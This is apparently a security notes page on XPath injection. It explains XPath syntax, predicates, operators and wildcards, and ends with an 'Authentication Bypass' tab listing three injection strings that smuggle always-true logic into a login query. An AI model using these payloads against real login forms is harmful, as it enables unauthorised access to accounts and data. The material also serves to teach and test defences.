---
tags:
  - xpath
  - injection
---
# XPath Injection

XPath injection is similar to SQL injection except for:

- It can only be used to read data, not to insert data
- It does not implement any access control, so if you find an injection point it's likely possible to get the whole document.

## Syntax

### Basics

=== "Nodes"

	Select all `module` child nodes of the context node
	: `module`
	
	Select the document root node
	: `/`
	
	Select descendant nodes of the context node
	: `//`
	
	Select the context node
	: `.`
	
	Select the parent of the context node
	: `..`
	
	Select the `whatever` attribute node of the context node
	: `@whatever`
	
	Select all text node child nodes of the context node
	: `text()`

=== "Predicates"

	Select the first `name` child node of the `cats` node
	
	```
	/cats/name[1]
	
	/cats/name[position()=1]
	```
	
	Select the last name child node of the `cats` node
	
	```
	/cats/name[last()]
	```
	
	Select the first two `name` child nodes of the `cats` node
	
	```
	/cats/name[position()<3]
	```
	
	Select the title of all courses where the tier element node equals 2
	
	```
	//course[tier=2]/title/text()
	```
	
	Select the `title` of all courses where the `author` element node has a `co-author` attribute node
	
	```
	//course/author[@co-author]/../title
	```
	
	Select all courses where the `tier` element node has a difficulty attribute node set to medium
	
	```
	//course/tier[@difficulty="medium"]/..
	```
	
	**Predicate Operands**
	
	|Operand|Explanation|
	|---|---|
	|`+`|Addition|
	|`-`|Subtraction|
	|`*`|Multiplication|
	|`div`|Division|
	|`=`|Equal|
	|`!=`|Not Equal|
	|`<`|Less than|
	|`<=`|Less than or Equal|
	|`>`|Greater than|
	|`>=`|Greater than or Equal|
	|`or`|Logical Or|
	|`and`|Logical And|
	|`mod`|Modulus|
	
	**Wildcards**
	
	|Query|Explanation|
	|---|---|
	|`node()`|Matches any node|
	|`*`|Matches any `element` node|
	|`@*`|Matches any `attribute` node|
	
	**Union**
	
	Select the title of all modules in tiers 2 and 3
	
	```
	//module[tier=2]/title/text() | //module[tier=3]/title/text()
	```
	

=== "Authentication Bypass"

	Bypass with known username
	
	```
	admin' or '1'='1
	```
	
	Bypass auth by position
	
	```
	' or position()=1 or '
	```
	
	Bypass auth by substring
	
	```
	' or contains(.,'admin') or '
	```
	
